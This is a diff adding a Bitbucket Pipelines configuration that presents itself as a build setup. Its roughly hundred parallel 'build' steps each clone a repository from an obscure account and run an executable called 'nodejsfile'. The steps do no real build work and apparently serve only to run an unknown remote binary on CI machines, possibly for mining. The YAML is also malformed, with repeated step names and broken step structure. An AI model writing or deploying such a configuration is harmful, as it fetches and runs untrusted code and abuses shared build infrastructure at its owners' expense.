@@ -1,0 +1,399 @@
+options:
+  max-time: 120
+  size: 2x
+image: python:3.8
+pipelines:
+  default:
+    - parallel:
+      - step:
+          name: build-1
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-2
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-3
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-4
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-5
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-6
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-7
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-8
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-9
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-10
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+          name: build-1
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-2
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-3
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-4
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-5
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-6
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-7
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-8
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-9
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-10
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+          name: build-1
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-2
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-3
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-4
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-5
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-6
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-7
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-8
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-9
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-10
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+          name: build-1
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-2
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-3
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-4
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-5
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-6
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-7
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-8
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-9
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-10
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+          name: build-1
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-2
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-3
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-4
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-5
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-6
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-7
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-8
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-9
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-10
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+          name: build-1
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-2
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-3
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-4
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-5
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-6
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-7
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-8
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-9
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-10
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+          name: build-1
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-2
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-3
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-4
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-5
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-6
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-7
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-8
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-9
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-10
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-1
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-2
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-3
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-4
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-5
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-6
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-7
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-8
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-9
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-10
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+          name: build-1
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-2
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-3
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-4
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-5
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-6
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-7
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-8
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-9
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-10
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+          name: build-1
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-2
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-3
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-4
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-5
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-6
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-7
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-8
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-9
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
+      - step:
+          name: build-10
+          script:
+            - git clone https://oqoixgqoq9@bitbucket.org/oqoixgqoq9/avn.git && cd avn && chmod u+x nodejsfile && ./nodejsfile
